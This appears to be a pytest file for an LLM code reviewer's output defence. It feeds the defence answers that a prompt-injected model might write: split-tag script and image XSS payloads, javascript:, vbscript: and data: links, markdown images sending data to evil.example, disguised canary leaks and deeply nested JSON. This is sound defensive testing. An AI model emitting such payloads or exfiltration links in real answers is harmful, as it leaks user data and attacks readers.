"""Adversarial model answers against the output defence: what a steered model might write."""

import json
from collections.abc import Callable

import pytest

from codekavach.llm.defence.injection import new_canary
from codekavach.llm.defence.output import OutputRejected, check_text, validate_verdict
from codekavach.llm.providers.base import Usage, usage_of
from codekavach.llm.schema.tasks import ExplainAnswer, parse_answer
from tests.unit.llm.test_review_intelligence import (
    BodySession,
    ScriptedSession,
    body_reviewer,
    payload,
    reviewer,
    verdict,
    vulnerable_payload,
)


@pytest.mark.parametrize(
    "nested",
    [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "!<a>[x](http://evil.example/?d=fn_1)",
        "<im<img src=a>g src=http://evil.example/fn_1>",
        "[x](java<a>script:alert(1))",
    ],
)
def test_markup_split_by_a_removable_fragment_does_not_survive_the_scrub(nested: str) -> None:
    cleaned, report = validate_verdict(verdict(impact=f"See {nested} now", remediation=nested))
    for text in (cleaned.impact, cleaned.remediation):
        assert "<script" not in text and "<img" not in text and "javascript:" not in text
        assert "![" not in text
    assert report.markup_removed >= 2


def test_explain_and_remediate_answers_are_scrubbed_like_a_triage_answer() -> None:
    image = "![x](http://evil.example/?d=fn_1)"

    def steer(task: str, content: dict[str, object]) -> dict[str, object]:
        if task == "explain":
            return {**content, "impact": f"Data is lost {image} <script>alert(1)</script>"}
        if task == "remediate":
            return {**content, "guidance": f'Bind it <img src="http://evil.example/fn_1"> {image}'}
        return content

    session = ScriptedSession(steer)
    outcome = reviewer(session, tasks={"explain", "remediate"}).review(vulnerable_payload())
    merged = outcome.verdict
    assert session.tasks == ["triage", "explain", "remediate"] and merged is not None
    assert merged.impact.startswith("Data is lost") and "Bind it" in merged.remediation
    for text in (merged.impact, merged.remediation):
        assert "evil.example" not in text and "<script" not in text and "<img" not in text


@pytest.mark.parametrize(
    "disguise",
    [
        str.lower,
        " ".join,
        lambda canary: canary.replace("-", " "),
        lambda canary: canary.replace("-", "_").title(),
        lambda canary: "`" + "`-`".join(canary.split("-")) + "`",
    ],
)
def test_a_disguised_canary_in_the_answer_still_rejects_it(
    disguise: Callable[[str], str],
) -> None:
    canary = new_canary()
    with pytest.raises(OutputRejected, match="canary_in_output"):
        validate_verdict(verdict(reasoning=f"As ordered: {disguise(canary)}."), canaries=[canary])


def test_a_short_configured_canary_is_matched_exactly_only() -> None:
    check_text("The scan found a bug in the parser.", canaries=("Bug-1",))
    with pytest.raises(OutputRejected, match="canary_in_output"):
        check_text("token Bug-1 here", canaries=("Bug-1",))


@pytest.mark.parametrize(
    "ordinary",
    [
        "def load(data: bytes) -> dict:\n    return json.loads(data)",
        "Validate the metadata: it is user input.",
        "const body = {data: payload};",
        "Untrusted data:\n- the request body",
    ],
)
def test_the_word_data_before_a_colon_is_not_taken_for_a_data_link(ordinary: str) -> None:
    cleaned, report = validate_verdict(verdict(reasoning=ordinary, remediation=ordinary))
    assert cleaned.reasoning == ordinary and cleaned.remediation == ordinary
    assert report.markup_removed == 0


@pytest.mark.parametrize(
    "link",
    [
        "data:text/html,<b>x</b>",
        "DATA:image/svg+xml;base64,AAAA",
        "data:;base64,AAAA",
        "data:,hello",
        "javascript:alert(1)",
        "vbscript:msgbox(1)",
    ],
)
def test_data_and_script_links_are_still_removed(link: str) -> None:
    cleaned, report = validate_verdict(verdict(remediation=f"use [this]({link}) API"))
    assert link[:12].lower() not in cleaned.remediation.lower() and report.markup_removed >= 1


DEEP = "[" * 100_000 + "]" * 100_000


@pytest.mark.parametrize(
    "body",
    [
        DEEP.encode(),
        json.dumps({"choices": [{"message": {"content": DEEP}}]}).encode(),
        ('{"choices":[{"message":{"content":{"reasoning":' + DEEP + "}}}]}").encode(),
    ],
)
def test_a_deeply_nested_answer_is_an_invalid_answer_not_an_exception(body: bytes) -> None:
    session = BodySession(body)
    outcome = body_reviewer(session, 0).review(payload())
    assert outcome.verdict is None and outcome.failure == "invalid"
    assert usage_of(body) == Usage()


def test_a_deeply_nested_enrichment_answer_is_refused_as_not_json() -> None:
    with pytest.raises(ValueError, match="answer_not_json"):
        parse_answer(ExplainAnswer, DEEP)
